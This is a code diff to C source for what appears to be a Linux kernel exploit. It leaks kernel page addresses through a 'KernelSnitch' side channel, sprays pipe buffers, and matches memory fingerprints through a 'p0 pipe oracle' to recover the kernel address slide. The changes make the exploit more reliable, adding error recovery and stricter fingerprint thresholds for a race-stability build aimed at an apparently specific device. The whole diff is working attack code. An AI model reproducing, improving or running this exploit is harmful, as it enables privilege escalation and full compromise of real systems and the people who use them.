@@ -204,7 +204,17 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
-    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
+    close_ctx_memfds(&prep);
+    close_ctx_memfds(&spray);
+    close_ctx_memfds(&pre);
+    close_ctx_memfds(&post);
+    free_ctx_storage(&prep);
+    free_ctx_storage(&spray);
+    free_ctx_storage(&pre);
+    free_ctx_storage(&post);
+    free(buf);
+    return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -276,7 +286,8 @@ uintptr_t prepare_pipe_buffer_page(void) {
   ssize_t got = read(result_pipe[0], &base, sizeof(base));
   SYSCHK(close(result_pipe[0]));
   if (got != (ssize_t)sizeof(base)) {
-    pr_error("pipe page child did not report base\n");
+    pr_warning("pipe page child did not report base\n");
+    base = 0;
   }
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     close(pipe_fds_drain[i][0]);
@@ -1006,6 +1017,22 @@ static void spawn_p0_ref_keeper(int retained_pipe_index) {
   }
 }
 
+void start_p0_ref_keeper(void) {
+  if (p0_gate_holders_initialized) {
+    return;
+  }
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    p0_gate_holders[i][0] = -1;
+    p0_gate_holders[i][1] = -1;
+  }
+  if (pipe2(p0_gate_holders[0], O_CLOEXEC) < 0) {
+    pr_error("p0 ref keeper gate pipe failed errno=%d\n", errno);
+    return;
+  }
+  p0_gate_holders_initialized = 1;
+  spawn_p0_ref_keeper(0);
+}
+
 int prepare_p0_pipe_oracle(void) {
   _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                  "unexpected pipe_buffer size");
@@ -1181,12 +1208,30 @@ static int p0_fingerprint_score(
   for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
     uint64_t value = 0;
     memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+    if (fingerprint->words[index] != 0 &&
+        value == fingerprint->words[index]) {
+#else
     if (value == fingerprint->words[index]) {
+#endif
       score++;
     }
   }
   return score;
 }
+
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+static int p0_fingerprint_significant_words(
+    const struct p0_fingerprint *fingerprint) {
+  int significant = 0;
+  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
+    if (fingerprint->words[index] != 0) {
+      significant++;
+    }
+  }
+  return significant;
+}
+#endif
 
 uintptr_t scan_p0_pipe_oracle(void) {
   unsigned char page[PAGE_SIZE];
@@ -1196,6 +1241,9 @@ uintptr_t scan_p0_pipe_oracle(void) {
   int best_score = -1;
   int second_score = -1;
   int changed_pages = 0;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+  int best_significant = 0;
+#endif
 
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     memset(page, 0, sizeof(page));
@@ -1234,6 +1282,10 @@ uintptr_t scan_p0_pipe_oracle(void) {
         second_score = best_score;
         best_score = score;
         best_slide = p0_fingerprints[index].slide;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+        best_significant =
+            p0_fingerprint_significant_words(&p0_fingerprints[index]);
+#endif
       } else if (score > second_score) {
         second_score = score;
       }
@@ -1256,7 +1308,12 @@ uintptr_t scan_p0_pipe_oracle(void) {
   pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
           changed_pages, best_score, second_score, best_slide);
 #endif
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+  if (changed_pages != 1 || best_score < 4 ||
+      best_score <= second_score || best_score * 2 < best_significant) {
+#else
   if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
+#endif
     return (uintptr_t)-1;
   }
   return best_slide;
